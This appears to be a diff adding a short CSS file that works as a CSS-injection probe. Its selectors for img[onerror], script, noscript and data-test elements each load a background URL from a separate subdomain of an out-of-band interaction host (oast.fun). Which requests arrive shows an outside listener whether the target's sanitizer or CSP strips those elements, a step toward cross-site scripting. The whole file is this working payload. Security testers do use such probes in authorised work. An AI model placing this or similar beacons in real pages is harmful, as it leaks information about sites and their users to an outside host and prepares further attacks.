@@ -1,0 +1,10 @@
+/* Detect if onerror attribute is present (CSP) vs stripped (sanitizer) */
+img[onerror] { background: url("http://has-onerror.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+img:not([onerror]) { background: url("http://no-onerror.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+*[data-test] { outline: 1px solid red; background: url("http://has-datatest.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+
+/* Detect script tags */
+script { display: block !important; background: url("http://has-script.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
+
+/* Detect noscript tags */  
+noscript { display: block !important; background: url("http://has-noscript.da7d01umtsrjn9sgh7s0in9hs1r87k9ik.oast.fun/") !important; }
